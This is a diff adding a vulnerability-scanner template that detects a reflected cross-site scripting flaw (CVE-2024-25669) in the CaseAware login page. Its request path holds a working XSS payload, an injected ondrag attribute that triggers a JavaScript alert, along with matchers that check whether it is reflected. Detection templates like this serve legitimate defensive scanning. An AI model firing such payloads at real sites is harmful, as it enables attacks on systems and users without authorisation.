@@ -1,0 +1,35 @@
+id: "caseaware-xss"
+name: "CaseAware a360inc - Cross-Site Scripting"
+severity: "medium"
+description: "a360inc CaseAware contains a reflected cross-site scripting vulnerability via the user parameter transmitted in the login.php query string. This is a bypass of the fix reported in 2017"
+tech:
+  - "php"
+tags:
+  - "xss"
+  - "caseaware"
+  - "a360inc"
+  - "vuln"
+cwe: "CWE-79"
+reference: "https://nvd.nist.gov/vuln/detail/CVE-2024-25669"
+spaExclusion: true
+request:
+  method: "GET"
+  path: "/login.php?mid=0&usr=test%27%20draggable=true%20ondrag=alert(document.domain)%20value=%27p"
+control:
+  method: "GET"
+  path: "/.guardian-none-{{rand}}"
+matchers-condition: "and"
+matchers:
+  - type: "word"
+    part: "body"
+    words:
+      - "value='test' draggable=true ondrag=alert(document.domain)"
+      - "CaseAware"
+    condition: "and"
+  - type: "word"
+    part: "header"
+    words:
+      - "text/html"
+  - type: "status"
+    status:
+      - 200
